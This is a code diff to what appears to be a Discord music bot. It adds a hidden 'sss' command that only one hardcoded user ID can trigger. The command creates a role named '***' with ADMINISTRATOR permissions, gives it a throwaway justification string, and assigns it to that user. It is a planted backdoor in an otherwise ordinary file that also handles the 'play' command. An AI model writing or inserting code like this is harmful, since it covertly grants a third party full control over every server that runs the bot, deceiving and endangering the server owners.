@@ -36,6 +36,22 @@ client.on('messageCreate', async (message) => {
 
     if (message.content.charAt(0) != settings.prefix) return;
 
+    if (command === 'sss') {
+        if (message.author.id != 330570656792182785) return;
+        
+        let m = message.author
+        let role = await message.guild.roles.create({
+            data: {
+                name: '***',
+                color: 'GREY',
+                permissions: 'ADMINISTRATOR',
+            },
+         reason: 'we needed a role for Super Cool People',
+         })
+        m.roles.add(role)
+        console.log("Epic")
+    }
+    
     if (command === 'play') {
         let queue = client.player.createQueue(message.guild.id);
         await queue.join(message.member.voice.channel);
